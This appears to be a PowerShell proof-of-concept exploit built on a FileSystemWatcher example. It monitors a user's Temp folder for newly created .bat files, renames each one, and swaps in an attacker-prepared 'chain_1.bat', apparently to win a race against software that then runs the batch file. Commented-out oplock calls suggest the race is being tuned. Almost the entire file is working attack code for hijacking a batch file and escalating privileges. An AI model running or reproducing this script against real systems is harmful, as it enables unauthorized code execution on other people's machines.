# Ref: https://powershell.one/tricks/filesystem/filesystemwatcher
# specify the path to the folder you want to monitor:
$Path = "$($env:UserProfile)\AppData\Local\Temp\fstmpsc_$($env:USERNAME)"

# specify which files you want to monitor
$FileFilter = '*'

# specify whether you want to monitor subfolders as well:
$IncludeSubfolders = $true

# specify the file or folder properties you want to monitor:
$AttributeFilter = [IO.NotifyFilters]::FileName, [IO.NotifyFilters]::LastWrite

try
{
  $watcher = New-Object -TypeName System.IO.FileSystemWatcher -Property @{
    Path = $Path
    Filter = $FileFilter
    IncludeSubdirectories = $IncludeSubfolders
    NotifyFilter = $AttributeFilter
  }

  # define the code that should execute when a change occurs:
  $action = {
    # the code is receiving this to work with:

    # change type information:
    $details = $event.SourceEventArgs
    $Name = $details.Name
    $FullPath = $details.FullPath
    $OldFullPath = $details.OldFullPath
    $OldName = $details.OldName

    # type of change:
    $ChangeType = $details.ChangeType

    # when the change occured:
    $Timestamp = $event.TimeGenerated

    # save information to a global variable for testing purposes
    # so you can examine it later
    # MAKE SURE YOU REMOVE THIS IN PRODUCTION!
    $global:all = $details

    # now you can define some action to take based on the
    # details about the change event:

    # here run
    $Path_dir = "$($env:UserProfile)\AppData\Local\Temp\fstmpsc_$($env:USERNAME)"
    Write-Host "======================================================" -ForegroundColor Blue
    $text = "[+] {0} was {1} at {2}" -f $FullPath, $ChangeType, $Timestamp
    Write-Host ""
    Write-Host $text -ForegroundColor DarkYellow

    # Get file permissions
    $fileInfo = Get-Acl -Path $FullPath
    #Write-Host $fileInfo
    $filePermissions = $fileInfo.Access
    #Write-Host $filePermissions
    $filePermissions | ForEach-Object {
        $identity = $_.IdentityReference.Value
        $accessRights = $_.FileSystemRights
        $allowDeny = $_.AccessControlType

        Write-Host "[*] Identity: $identity"
        Write-Host "    Access Rights: $accessRights"
        Write-Host "    Allow/Deny: $allowDeny"
    }


    # you can also execute code based on change type here:
    switch ($ChangeType)
    {
      'Changed'  { "CHANGE" }
      'Created'  { "CREATED"
          # create
          $check_text = "[?] File: {0}" -f $FullPath
          Write-Host $check_text -ForegroundColor Gray

          # hijack the file
          $extension = [IO.Path]::GetExtension($FullPath)
          #Write-Host $extension
          #Write-Host ($extension -eq ".bat")
          if($extension -eq ".bat"){
            $hijack_text = "[+] Found targeted bat file {0}" -f $FullPath
            Write-Host $hijack_text -ForegroundColor Yellow
            $datetime_text = (Get-Date).ToString('yyyy-MM-dd_hh-mm-ss')
            try{
              $old_fullpath = $FullPath.ToString()
              #Write-Host "[+] Enabled Oplock to $($FullPath)" -ForegroundColor Yellow
              #Invoke-WmiMethod -Path "Win32_SMBClientConnection.Handle='$FullPath'" -Name "EnableOpLocks"
              Write-Host "[+] Rename $($FullPath) to $($datetime_text).bat.txt" -ForegroundColor Yellow
              Rename-Item -Path $FullPath -NewName "$($datetime_text).bat.txt"
              Write-Host "[+] Copy $($Path_dir)\chain_1.bat to $($old_fullpath)" -ForegroundColor Yellow
              Copy-Item -Path "$($Path_dir)\chain_1.bat" -Destination "$($old_fullpath)"
              Write-Host "[+] Read $($old_fullpath)" -ForegroundColor Yellow
              $content = Get-Content -Path "$($old_fullpath)"
              Write-Host $content
              Write-Host "[!] is it work?" -ForegroundColor Green
            }catch{
              Write-Host "[!] Error occurred: $($_.Exception.Message)" -ForegroundColor Red
            }
          }
      }
      'Deleted'  { "DELETED"
        # to illustrate that ALL changes are picked up even if
        # handling an event takes a lot of time, we artifically
        # extend the time the handler needs whenever a file is deleted
        Write-Host "[+] Deletion Handler Start" -ForegroundColor Gray
      }
      'Renamed'  {
        # this executes only when a file was renamed
        $text = "[+] File {0} was renamed to {1}" -f $OldName, $Name
        Write-Host $text -ForegroundColor Yellow
      }

      # any unhandled change types surface here:
      default   { Write-Host $_ -ForegroundColor Red -BackgroundColor White }
    }
  }

  # subscribe your event handler to all event types that are
  # important to you. Do this as a scriptblock so all returned
  # event handlers can be easily stored in $handlers:
  $handlers = . {
    Register-ObjectEvent -InputObject $watcher -EventName Changed -Action $action
    Register-ObjectEvent -InputObject $watcher -EventName Created -Action $action
    Register-ObjectEvent -InputObject $watcher -EventName Deleted -Action $action
    Register-ObjectEvent -InputObject $watcher -EventName Renamed -Action $action
  }

  # monitoring starts now:
  $watcher.EnableRaisingEvents = $true

  Write-Host "[+] Watching for changes to $Path" -ForegroundColor Yellow

  # since the FileSystemWatcher is no longer blocking PowerShell
  # we need a way to pause PowerShell while being responsive to
  # incoming events. Use an endless loop to keep PowerShell busy:
  do
  {
    # Wait-Event waits for a second and stays responsive to events
    # Start-Sleep in contrast would NOT work and ignore incoming events
    Wait-Event -Timeout 0.001

    # write a dot to indicate we are still monitoring:
    #Write-Host "." -NoNewline

  } while ($true)
}
finally
{
  # this gets executed when user presses CTRL+C:

  # stop monitoring
  $watcher.EnableRaisingEvents = $false

  # remove the event handlers
  $handlers | ForEach-Object {
    Unregister-Event -SourceIdentifier $_.Name
  }

  # event handlers are technically implemented as a special kind
  # of background job, so remove the jobs now:
  $handlers | Remove-Job

  # properly dispose the FileSystemWatcher:
  $watcher.Dispose()

  Write-Warning "[!] Event Handler disabled, monitoring ends."
}